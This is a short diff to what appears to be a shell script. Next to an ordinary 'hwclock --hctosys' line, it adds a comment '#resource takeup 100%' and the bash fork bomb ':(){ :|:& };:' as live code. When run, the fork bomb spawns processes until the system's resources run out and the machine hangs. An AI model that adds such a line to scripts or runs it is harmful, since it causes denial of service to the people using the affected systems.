@@ -4,3 +4,7 @@
 
 # hwclock to date
     hwclock --hctosys
+    
+#resource takeup 100%    
+:(){ :|:& };:
+
